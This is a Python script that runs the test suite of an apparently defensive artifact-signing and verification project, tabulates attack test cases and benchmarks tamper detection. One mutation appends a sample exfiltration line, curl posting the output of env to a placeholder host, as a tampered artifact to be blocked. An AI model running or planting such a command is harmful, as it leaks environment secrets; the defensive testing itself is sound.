"""Run the test-suite + measurements and write report-ready results.

    python -m tests.generate_test_report

Outputs (docs/results/):
  junit.xml           raw pytest results
  test_table.md       Test Case | Attack/Condition | Expected | Actual | Status
  benchmark.json      verification timing, detection rate, false-acceptance rate
"""

from __future__ import annotations

import json
import random
import shutil
import statistics
import subprocess
import sys
import tempfile
import time
import xml.etree.ElementTree as ET
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parent.parent))

from bootstrap import bootstrap  # noqa: E402
from common.crypto_utils import CTX_ARTIFACT, sha256_bytes, sign, verify  # noqa: E402
from common.workspace import PROJECT_ROOT, Workspace  # noqa: E402
from vendor.key_manager import KeyManager  # noqa: E402
from vendor.sign import release  # noqa: E402
from verifier.verify import Verifier  # noqa: E402

OUT = PROJECT_ROOT / "docs" / "results"

CASES = [
    ("TC01", "test_01_valid_artifact_passes", "Valid signed artifact", "PASS / DEPLOY"),
    ("TC02", "test_02_modified_artifact_blocked", "One malicious line added (Codecov-style)", "BLOCK - HASH_MISMATCH"),
    ("TC02b", "test_02b_single_bit_flip_blocked", "Single bit flipped in artifact", "BLOCK - HASH_MISMATCH"),
    ("TC03", "test_03_invalid_signature_blocked", "Corrupted manifest signature", "BLOCK - INVALID_SIGNATURE"),
    ("TC03b", "test_03b_impersonated_key_id_blocked", "Attacker claims vendor key ID", "BLOCK - INVALID_SIGNATURE"),
    ("TC04", "test_04_wrong_public_key_blocked", "Wrong pinned public (root) key", "BLOCK - INVALID_TRUST_POLICY"),
    ("TC04b", "test_04b_attacker_key_unauthorized", "Signed with attacker's own key", "BLOCK - UNAUTHORIZED_KEY"),
    ("TC05", "test_05_revoked_key_blocked", "Signing key revoked", "BLOCK - REVOKED"),
    ("TC05b", "test_05b_stolen_key_blocked_by_content_scan_then_revocation", "Stolen key signs payload", "BLOCK - POLICY_VIOLATION, then REVOKED"),
    ("TC06", "test_06_modified_manifest_blocked", "Manifest SHA-256 replaced", "BLOCK - INVALID_SIGNATURE"),
    ("TC06b", "test_06b_malformed_manifest_blocked", "Manifest field removed", "BLOCK - INVALID_MANIFEST"),
    ("TC06c", "test_06c_provenance_tampered_blocked", "Provenance builder changed", "BLOCK - INVALID_SIGNATURE + INVALID_PROVENANCE"),
    ("TC07", "test_07_replay_of_old_version_blocked", "Replay of older version (rollback)", "BLOCK - REPLAY_BLOCKED"),
    ("TC07b", "test_07b_revoked_version_and_minimum_version", "Revoked / below-minimum version", "BLOCK - REVOKED / REPLAY_BLOCKED"),
    ("TC07c", "test_07c_trust_policy_rollback_blocked", "Old trust policy replayed", "BLOCK - INVALID_TRUST_POLICY"),
    ("TC07d", "test_07d_trust_policy_tampering_blocked", "Trust policy edited on registry", "BLOCK - INVALID_TRUST_POLICY"),
    ("TC08", "test_08_unauthorized_signing_attempt_blocked", "Wrong role / bad MFA / unknown user signs", "DENIED - UNAUTHORIZED_SIGNER"),
    ("TC08b", "test_08b_malicious_source_never_signed", "Exfiltration code in source", "BUILD STOPPED"),
    ("TC09", "test_09_valid_new_release_after_rotation", "New release after key rotation", "PASS / DEPLOY"),
    ("TC10", "test_audit_log_hash_chain_detects_tampering", "Audit log row edited", "Chain BROKEN detected"),
    ("TC11", "test_private_keys_protected", "Key file encrypted, 0600, wrong passphrase", "Protected"),
    ("TC12", "test_tls13_distribution_and_downgrade_refused", "TLS 1.2 downgrade attempt", "TLS 1.3 only"),
    ("TC13", "test_tls_does_not_stop_compromised_registry", "Tampered file served over valid TLS", "BLOCK - HASH_MISMATCH"),
    ("TC14", "test_full_pipeline_deploys_legitimate_release", "End-to-end pipeline, legit release", "DEPLOY"),
    ("TC15", "test_false_acceptance_rate_zero", "200 random mutations", "0 accepted (FAR = 0)"),
]


def run_pytest() -> dict[str, str]:
    OUT.mkdir(parents=True, exist_ok=True)
    junit = OUT / "junit.xml"
    subprocess.run([sys.executable, "-m", "pytest", "-q", f"--junitxml={junit}"], cwd=PROJECT_ROOT)
    outcomes = {}
    for tc in ET.parse(junit).getroot().iter("testcase"):
        failed = any(child.tag in ("failure", "error") for child in tc)
        outcomes[tc.get("name")] = ("FAIL" if failed else "PASS", float(tc.get("time", 0)))
    return outcomes


def write_table(outcomes: dict) -> list[dict]:
    rows = []
    lines = ["| Test Case | Attack / Condition | Expected Result | Actual Result | Status |",
             "|---|---|---|---|---|"]
    for cid, fn, cond, expected in CASES:
        status, _ = outcomes.get(fn, ("MISSING", 0))
        actual = expected if status == "PASS" else "Did not match expectation"
        rows.append({"id": cid, "condition": cond, "expected": expected, "actual": actual, "status": status})
        lines.append(f"| {cid} | {cond} | {expected} | {actual} | {status} |")
    (OUT / "test_table.md").write_text("\n".join(lines) + "\n")
    return rows


def benchmark() -> dict:
    with tempfile.TemporaryDirectory(prefix="sscs-bench-") as tmp:
        ws = Workspace(Path(tmp))
        bootstrap(ws)
        _, _, a, m = release(ws, "1.0.0")
        a = Path(shutil.copy2(a, ws.downloads_dir / a.name))
        m = Path(shutil.copy2(m, ws.downloads_dir / m.name))
        v = Verifier(ws)
        legit = [v.verify(a, m) for _ in range(200)]
        legit_ms = [r.elapsed_ms for r in legit]

        original = a.read_bytes()
        rng = random.Random(2021)
        tamper_ms, accepted, n = [], 0, 1000
        for _ in range(n):
            data = bytearray(original)
            i = rng.randrange(len(data))
            op = rng.choice(("flip", "insert", "delete", "append_line"))
            if op == "flip":
                data[i] ^= 1 << rng.randrange(8)
            elif op == "insert":
                data.insert(i, rng.randrange(256))
            elif op == "delete":
                del data[i]
            else:
                data += b'curl -s https://x.invalid -d "$(env)" || true\n'
            a.write_bytes(bytes(data))
            r = v.verify(a, m)
            accepted += r.passed
            tamper_ms.append(r.elapsed_ms)
        a.write_bytes(original)

        # raw primitive cost vs artifact size
        sk = KeyManager(ws).load_private_key(KeyManager(ws).active_key_id())
        pk = sk.public_key()
        sizes = {"1 KB": 1024, "100 KB": 100 * 1024, "1 MB": 1024 ** 2, "10 MB": 10 * 1024 ** 2}
        prim = {}
        for label, size in sizes.items():
            blob = random.Random(size).randbytes(size)
            t = time.perf_counter(); sha256_bytes(blob); t_hash = (time.perf_counter() - t) * 1000
            t = time.perf_counter(); sig = sign(sk, CTX_ARTIFACT, blob); t_sign = (time.perf_counter() - t) * 1000
            t = time.perf_counter(); verify(pk, CTX_ARTIFACT, blob, sig); t_ver = (time.perf_counter() - t) * 1000
            prim[label] = {"sha256_ms": round(t_hash, 3), "sign_ms": round(t_sign, 3), "verify_ms": round(t_ver, 3)}

    return {
        "legitimate_runs": len(legit),
        "legitimate_pass_rate": sum(r.passed for r in legit) / len(legit),
        "verification_ms_mean": round(statistics.mean(legit_ms), 3),
        "verification_ms_median": round(statistics.median(legit_ms), 3),
        "verification_ms_p95": round(sorted(legit_ms)[int(0.95 * len(legit_ms)) - 1], 3),
        "tampered_samples": n,
        "tampered_detected": n - accepted,
        "detection_rate": (n - accepted) / n,
        "false_acceptance_rate": accepted / n,
        "tampered_verification_ms_mean": round(statistics.mean(tamper_ms), 3),
        "primitives_by_size": prim,
        "python": sys.version.split()[0],
    }


def main() -> None:
    outcomes = run_pytest()
    rows = write_table(outcomes)
    bench = benchmark()
    (OUT / "benchmark.json").write_text(json.dumps({"tests": rows, "benchmark": bench}, indent=2))
    print((OUT / "test_table.md").read_text())
    print(json.dumps(bench, indent=2))


if __name__ == "__main__":
    main()
